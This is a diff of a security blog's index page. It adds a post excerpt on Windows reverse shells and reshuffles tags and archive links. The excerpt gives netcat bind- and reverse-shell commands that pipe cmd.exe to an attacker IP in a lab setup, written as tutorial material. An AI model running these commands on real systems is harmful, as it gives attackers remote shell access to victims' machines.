@@ -391,9 +391,9 @@ N/A
             
             <div class= abstract-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞挖掘">漏洞挖掘</a>
-    
         <a class="post-tag" href="javascript:void(0);" data-tags = "CMS">CMS</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞挖掘">漏洞挖掘</a>
     
 </div>
             
@@ -461,6 +461,46 @@ ps：为什么我们要在受害机的s...
             <div class= abstract-tags >
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "木马后门">木马后门</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/08/03/Windows%20%E5%8F%8D%E5%BC%B9%20Shell/" >
+            
+                <span>Windows 反弹 Shell</span>
+        </a>
+        <div class="abstract-content">
+            NC 反弹 shell攻击场景：
+12　　Victim IP：  192.168.2.10　　Attacker IP：192.168.2.11
+
+正向 Shell我们想要弹回Victim的Shell，使用如下命令：
+Victim：nc -lvp 9999 -e cmd.exe
+Attacker：nc 192.168.2.10 9999 
+ps：先在肉鸡上开一个cmd服务，然后在攻击机上进行连接
+反向 ShellAttacker：nc -vlp 9999
+Victim：nc 192.168.2.11 9999 -e cmd.exe
+ps：先在攻击机上进行监听，然后在肉鸡上给Attacker...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/03</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "木马后门">木马后门</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "PowerShell">PowerShell</a>
     
 </div>
             
@@ -699,57 +739,6 @@ RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“�
         <a class="post-tag" href="javascript:void(0);" data-tags = "RFI">RFI</a>
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "Bypass">Bypass</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/05/12/Linux-DHCP%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/" >
-            
-                <span>Linux DHCP 服务器配置与管理</span>
-        </a>
-        <div class="abstract-content">
-            一、环境介绍：
-　　运行软件：VMware Workstation Pro 14
-　　系统环境：CentOS-7-x86_64-1810
-二、操作配置：
-1、DHCP 服务器搭建
-1)安装DHCP
-1yum install dhcp
-
-2) 设置虚拟机为仅主机模式、关闭虚拟机依靠主机的 DHCP 服务
-
-3) 配置dhcpd.conf (动态获取IP)
-
-4) 重启dhcpd服务
-1systemctl restart dhcpd
-
-5) 重启网卡
-1systemctl restart network
-
-6) 查看客户端 IP
-
-7) 配置dhcpd.conf (固定获取IP)
- 
-8) ...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/12</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Linux">Linux</a>
     
 </div>
             
@@ -1885,16 +1874,9 @@ RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“�
     
     
     
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 69
+        Total : 70
         </div>
         <!-- search  -->
         
@@ -2015,6 +1997,11 @@ RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“�
     
         <li class="archive-post-item">
             <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/" >Linux 反弹 Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2019/08/03/Windows%20%E5%8F%8D%E5%BC%B9%20Shell/" >Windows 反弹 Shell</a>
         </li>
     
     
@@ -2228,12 +2215,12 @@ RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“�
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2018/06/10/msf%E7%99%BB%E9%99%86Windows-1/" >MSF 登陆Windows 1</a>
+            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2018/06/10/msf%E7%99%BB%E9%99%86Windows-2/" >MSF 登陆Windows 2</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2018/06/10/msf%E7%99%BB%E9%99%86Windows-2/" >MSF 登陆Windows 2</a>
+            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2018/06/10/msf%E7%99%BB%E9%99%86Windows-1/" >MSF 登陆Windows 1</a>
         </li>
     
     
@@ -2282,33 +2269,33 @@ RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“�
     
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
-        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+        <span class="sidebar-tag-name" data-tags="神兵利器"><span class="iconfont-archer">&#xe606;</span>神兵利器</span>
     
         <span class="sidebar-tag-name" data-tags="AWD"><span class="iconfont-archer">&#xe606;</span>AWD</span>
     
         <span class="sidebar-tag-name" data-tags="SQLite"><span class="iconfont-archer">&#xe606;</span>SQLite</span>
     
+        <span class="sidebar-tag-name" data-tags="安卓开发"><span class="iconfont-archer">&#xe606;</span>安卓开发</span>
+    
         <span class="sidebar-tag-name" data-tags="Apple"><span class="iconfont-archer">&#xe606;</span>Apple</span>
     
         <span class="sidebar-tag-name" data-tags="CBC"><span class="iconfont-archer">&#xe606;</span>CBC</span>
     
-        <span class="sidebar-tag-name" data-tags="CSRF"><span class="iconfont-archer">&#xe606;</span>CSRF</span>
+        <span class="sidebar-tag-name" data-tags="密码研究"><span class="iconfont-archer">&#xe606;</span>密码研究</span>
     
-        <span class="sidebar-tag-name" data-tags="DVWA"><span class="iconfont-archer">&#xe606;</span>DVWA</span>
-    
-        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+        <span class="sidebar-tag-name" data-tags="CMS"><span class="iconfont-archer">&#xe606;</span>CMS</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
-    
-        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+        <span class="sidebar-tag-name" data-tags="CSRF"><span class="iconfont-archer">&#xe606;</span>CSRF</span>
     
         <span class="sidebar-tag-name" data-tags="数据结构"><span class="iconfont-archer">&#xe606;</span>数据结构</span>
     
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
         <span class="sidebar-tag-name" data-tags="MacOS"><span class="iconfont-archer">&#xe606;</span>MacOS</span>
     
-        <span class="sidebar-tag-name" data-tags="神兵利器"><span class="iconfont-archer">&#xe606;</span>神兵利器</span>
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
     
         <span class="sidebar-tag-name" data-tags="木马后门"><span class="iconfont-archer">&#xe606;</span>木马后门</span>
     
@@ -2316,7 +2303,7 @@ RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“�
     
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
     
-        <span class="sidebar-tag-name" data-tags="二进制"><span class="iconfont-archer">&#xe606;</span>二进制</span>
+        <span class="sidebar-tag-name" data-tags="后门分析"><span class="iconfont-archer">&#xe606;</span>后门分析</span>
     
         <span class="sidebar-tag-name" data-tags="BackDoor"><span class="iconfont-archer">&#xe606;</span>BackDoor</span>
     
@@ -2324,19 +2311,23 @@ RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“�
     
         <span class="sidebar-tag-name" data-tags="Bypass"><span class="iconfont-archer">&#xe606;</span>Bypass</span>
     
+        <span class="sidebar-tag-name" data-tags="SQLInjection"><span class="iconfont-archer">&#xe606;</span>SQLInjection</span>
+    
         <span class="sidebar-tag-name" data-tags="Vim"><span class="iconfont-archer">&#xe606;</span>Vim</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
+        <span class="sidebar-tag-name" data-tags="DVWA"><span class="iconfont-archer">&#xe606;</span>DVWA</span>
+    
         <span class="sidebar-tag-name" data-tags="MSF"><span class="iconfont-archer">&#xe606;</span>MSF</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="Tmux"><span class="iconfont-archer">&#xe606;</span>Tmux</span>
     
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
         <span class="sidebar-tag-name" data-tags="IPS"><span class="iconfont-archer">&#xe606;</span>IPS</span>
-    
-        <span class="sidebar-tag-name" data-tags="Firewalld"><span class="iconfont-archer">&#xe606;</span>Firewalld</span>
-    
-        <span class="sidebar-tag-name" data-tags="PE"><span class="iconfont-archer">&#xe606;</span>PE</span>
     
         <span class="sidebar-tag-name" data-tags="文件结构"><span class="iconfont-archer">&#xe606;</span>文件结构</span>
     
@@ -2346,19 +2337,17 @@ RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“�
     
         <span class="sidebar-tag-name" data-tags="电子取证"><span class="iconfont-archer">&#xe606;</span>电子取证</span>
     
+        <span class="sidebar-tag-name" data-tags="HTTP"><span class="iconfont-archer">&#xe606;</span>HTTP</span>
+    
         <span class="sidebar-tag-name" data-tags="路由协议"><span class="iconfont-archer">&#xe606;</span>路由协议</span>
     
-        <span class="sidebar-tag-name" data-tags="安卓开发"><span class="iconfont-archer">&#xe606;</span>安卓开发</span>
+        <span class="sidebar-tag-name" data-tags="Firewalld"><span class="iconfont-archer">&#xe606;</span>Firewalld</span>
     
-        <span class="sidebar-tag-name" data-tags="CMS"><span class="iconfont-archer">&#xe606;</span>CMS</span>
+        <span class="sidebar-tag-name" data-tags="PE"><span class="iconfont-archer">&#xe606;</span>PE</span>
     
-        <span class="sidebar-tag-name" data-tags="后门分析"><span class="iconfont-archer">&#xe606;</span>后门分析</span>
+        <span class="sidebar-tag-name" data-tags="二进制"><span class="iconfont-archer">&#xe606;</span>二进制</span>
     
-        <span class="sidebar-tag-name" data-tags="SQLInjection"><span class="iconfont-archer">&#xe606;</span>SQLInjection</span>
-    
-        <span class="sidebar-tag-name" data-tags="密码研究"><span class="iconfont-archer">&#xe606;</span>密码研究</span>
-    
-        <span class="sidebar-tag-name" data-tags="HTTP"><span class="iconfont-archer">&#xe606;</span>HTTP</span>
+        <span class="sidebar-tag-name" data-tags="PowerShell"><span class="iconfont-archer">&#xe606;</span>PowerShell</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
